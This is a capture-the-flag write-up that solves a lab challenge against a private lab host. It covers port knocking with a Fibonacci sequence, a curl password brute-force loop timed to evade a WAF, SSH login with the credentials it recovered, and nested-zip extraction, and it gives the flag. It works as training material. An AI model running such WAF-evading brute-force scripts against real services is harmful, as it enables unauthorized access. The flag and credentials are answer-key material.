---
title: "Nicolay Magic Numbers — Network Knocker & Brute Force"
date: 2026-06-03
description: "A multi-stage challenge involving port knocking with a Fibonacci sequence, WAF bypass via rate limiting, and a nested zip bomb requiring scripted extraction."
---

## Overview

"Nicolay Magic Numbers" is a multi-stage challenge that chains together port knocking, firewall evasion, and brute force techniques. The player must discover a hidden service locked behind a Fibonacci-based port knocking sequence, bypass a Web Application Firewall (WAF) using a rate-limited brute force script, and then defeat a 50-layer nested zip bomb to retrieve the final flag.

---

## Techniques Covered

- **Port Knocking:** Unlocking a firewall rule by sending packets to ports in a specific sequence.
- **Fibonacci Sequence:** Using mathematical knowledge to determine the correct knock sequence.
- **WAF Bypass:** Rate-limiting requests to stay below a detection threshold.
- **Scripted Brute Force:** Automating credential testing with controlled timing.
- **Zip Bomb:** Defeating recursively nested compressed archives with a loop script.

---

## Solution Walkthrough

### Step 1 — Initial Reconnaissance
Begin with a port scan to identify exposed services:
```bash
nmap -sC -sV 172.30.2.34
```

---

### Step 2 — Discovering the Knock Sequence
Clues in the challenge indicate that the correct knock sequence uses the first 6 Fibonacci numbers (excluding zero): **1, 1, 2, 3, 5, 8**. These are sent via UDP to port 1000:
```bash
for p in 1 1 2 3 5 8; do echo "$p" | nc -u -w1 172.30.2.34 1000; done
```
The service validates each step in real time. On success, port 5000 is unlocked for a 5-minute window.

---

### Step 3 — Accessing Port 5000
Visiting port 5000 now returns an authentication prompt requiring credentials in a specific JSON format.

---

### Step 4 — WAF-Bypassing Brute Force Script
Direct high-speed requests to port 5000 are blocked by the WAF. A controlled script reads a credentials file and submits each password with a 2.1-second delay to stay under the WAF threshold:
```bash
while read -r line; do
  pass=$(echo "$line" | cut -d':' -f2)
  response=$(curl -s -X POST http://172.30.2.34:5000/ \
    -H "Content-Type: application/json" \
    -d "{\"password\":\"$pass\"}")
  echo "Password: $pass -> Response: $response"
  sleep 2.1
done < credentials.txt
```
**SSH credentials found:** `student` / `NiCoL4y_M4gIC_NuMb3rS`

---

### Step 5 — SSH Access & Nested Zip Extraction
```bash
ssh student@172.30.2.34
```
A `level50.zip` awaits. Automate all 50 extraction levels:
```bash
f="level50.zip"; while [[ -f "$f" && "$f" == *.zip ]]; do n=$(unzip -Z1 "$f" | head -n1); unzip -o "$f"; rm "$f"; f="$n"; done
```
The loop processes levels 49 down to 1, leaving the final plaintext file.

---

### Step 6 — Flag Capture
```bash
cat flag.txt
```

---

## Flag

`fLaG_fSt_{sCrIpTiNg_Is_AwEsOmE}`
